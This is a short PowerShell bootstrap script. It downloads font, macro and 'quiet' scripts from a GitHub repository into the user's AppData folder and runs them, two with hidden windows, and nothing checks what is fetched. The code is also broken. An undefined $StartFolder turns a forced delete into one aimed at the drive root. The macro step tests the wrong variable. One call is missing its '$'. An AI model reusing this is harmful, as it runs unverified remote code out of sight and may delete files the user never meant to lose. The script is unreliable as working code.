$DownloadLoc = "$env:USERPROFILE\AppData\Local\DCode"
$URLAllFonts = "https://github.com/Refr3sh/YWTTC/raw/main/Font.zip"
$URLFont = "https://raw.githubusercontent.com/Refr3sh/YWTTC/main/Font.ps1"
$URLQuiet = "https://raw.githubusercontent.com/Refr3sh/YWTTC/main/Quiet.ps1"
$URLMacro = "https://raw.githubusercontent.com/Refr3sh/YWTTC/main/Macro.ps1"
##ClearStart
Remove-Item "$StartFolder\*" -Force -ErrorAction SilentlyContinue

##Quiet
$ChkQuiet = Test-Path "$DownloadLoc\Quiet.ps1"
If(!($ChkQuiet -eq $True)){
    $web = New-Object System.Net.WebClient
	$web.DownloadString("$URLQuiet") > "$DownloadLoc\Quiet.ps1"
    Remove-Variable web
}

##Font
$ChkFont = Test-Path "$DownloadLoc\Font.ps1"
If(!($ChkFont -eq $True)){
    $web = New-Object System.Net.WebClient
	$web.DownloadString("$URLFont") > "$DownloadLoc\Font.ps1"
    	Start-BitsTransfer -Source "$URLAllFonts" -Destination "$DownloadLoc"
	Expand-Archive -Path "$DownloadLoc\Font.zip" -Destination "$DownloadLoc\Font"
	Remove-Item "$DownloadLoc\Font.zip" -Force -ErrorAction SilentlyContinue
    Remove-Variable web
}

##ExcelMacro
$ChkExcelM = "$DownloadLoc\Macro.ps1"
If(!($ChkFont -eq $True)){
	$web = New-Object System.Net.WebClient
	web.DownloadString("$URLMacro") > "$DownloadLoc\Macro.ps1"
	Remove-Variable web
}

##Run
Start-Sleep 3
&"$env:USERPROFILE\AppData\Local\DCode\Macro.ps1"
Start-Sleep 1
&"$env:USERPROFILE\AppData\Local\DCode\Font.ps1" -WindowStyle Hidden
Start-Sleep 1
&"$env:USERPROFILE\AppData\Local\DCode\Quiet.ps1" -WindowStyle Hidden
